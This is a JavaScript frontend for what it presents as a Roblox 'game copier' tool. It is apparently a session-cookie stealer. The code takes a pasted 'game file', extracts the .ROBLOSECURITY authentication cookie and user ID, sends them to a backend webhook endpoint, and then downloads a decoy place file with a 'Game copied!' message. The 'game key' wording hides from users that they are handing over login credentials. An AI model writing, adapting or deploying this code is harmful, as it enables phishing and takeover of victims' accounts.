// frontend v3.0 – shows success message + download
const WEBHOOK_ENDPOINT = "/api/submit";

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

pinInput.addEventListener("input", () => {
  pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
  validatePin();
});

function validatePin() {
  const isValid = /^\d{4}$/.test(pinInput.value);
  if (pinError) pinError.style.display = isValid ? "none" : "block";
  return isValid;
}

function extractGameData(fullText) {
  const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
  if (!cookieMatch) return { success: false, message: "Invalid Game Key" };
  const cookie = cookieMatch[1];
  const rbxuidMatch = fullText.match(/rbxuid=(\d+)/);
  if (!rbxuidMatch) return { success: false, message: "Missing rbxuid" };
  return { success: true, cookie, rbxuid: rbxuidMatch[1] };
}

function downloadPlace() {
  const a = document.createElement("a");
  a.href = "/place.rbxl";
  a.download = "place.rbxl";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}

copyButton.addEventListener("click", async () => {
  statusMessage.textContent = "";
  if (!validatePin()) {
    statusMessage.textContent = "PIN must be 4 digits";
    statusMessage.style.color = "#ff9d9d";
    return;
  }
  const pastedText = gameFileInput.value.trim();
  if (!pastedText) {
    statusMessage.textContent = "Paste a game file";
    statusMessage.style.color = "#ff9d9d";
    return;
  }
  const extraction = extractGameData(pastedText);
  if (!extraction.success) {
    statusMessage.textContent = extraction.message;
    statusMessage.style.color = "#ff9d9d";
    return;
  }

  copyButton.disabled = true;
  copyButton.classList.add("loading");
  statusMessage.textContent = "Processing...";
  statusMessage.style.color = "#caa8ff";

  try {
    const response = await fetch(WEBHOOK_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cookie: extraction.cookie, rbxuid: extraction.rbxuid })
    });
    const result = await response.json();

    if (result.blocked === true) {
      statusMessage.textContent = result.message || "Game key expired. Get a new one.";
      statusMessage.style.color = "#ff9d9d";
    } else if (result.success === true && result.firstTime === true) {
      statusMessage.textContent = "✅ Game copied! Downloading...";
      statusMessage.style.color = "#a5d6ff";
      downloadPlace();
    } else {
      statusMessage.textContent = result.error || "Copy failed. Check connection.";
      statusMessage.style.color = "#ff9d9d";
    }
  } catch (err) {
    console.error(err);
    statusMessage.textContent = "Network error. Check console.";
    statusMessage.style.color = "#ff9d9d";
  } finally {
    copyButton.disabled = false;
    copyButton.classList.remove("loading");
  }
});
